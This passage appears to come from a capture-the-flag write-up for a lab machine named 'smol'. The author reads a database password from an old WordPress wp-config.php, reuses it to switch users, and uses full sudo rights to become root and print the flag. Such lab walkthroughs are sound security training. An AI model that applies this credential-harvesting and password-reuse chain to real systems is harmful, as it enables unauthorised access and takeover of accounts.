Now let's unzip on the target :

```
gege@smol:~$ ls
wordpress.old  wordpress.old.zip
gege@smol:~$ cd wordpress.old/
gege@smol:~/wordpress.old$ ls
index.php    wp-activate.php     wp-comments-post.php  wp-cron.php        wp-load.php   wp-settings.php   xmlrpc.php
license.txt  wp-admin            wp-config.php         wp-includes        wp-login.php  wp-signup.php
readme.html  wp-blog-header.php  wp-content            wp-links-opml.php  wp-mail.php   wp-trackback.php
gege@smol:~/wordpress.old$ cat wp-config.php 
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the web site, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/documentation/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'xavi' );

/** Database password */
define( 'DB_PASSWORD', 'P@ssw0rdxavi@' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication unique keys and salts.
 *
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 *
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'put your unique phrase here' );
define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
define( 'NONCE_KEY',        'put your unique phrase here' );
define( 'AUTH_SALT',        'put your unique phrase here' );
define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
define( 'NONCE_SALT',       'put your unique phrase here' );

/**#@-*/

/**
 * WordPress database table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/documentation/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', true );

/* Add any custom values between this line and the "stop editing" line. */



/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';

```
## Fourth User Access

We have the password for `xavi` let's try password reuse :

```
gege@smol:~/wordpress.old$ su xavi
Password: 
xavi@smol:/home/gege/wordpress.old$ 
```

Boom, we check for privileges and groups :

```
xavi@smol:/home/gege/wordpress.old$ sudo -l
[sudo] password for xavi: 

Matching Defaults entries for xavi on smol:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User xavi may run the following commands on smol:
    (ALL : ALL) ALL

```

We can just `sudo su`  and cat the root flag :

```
xavi@smol:/$ sudo su
root@smol:/$ cat /root/root.txt
bf89ea3ea01992353aef1f576214d4e4
```

Pwned !!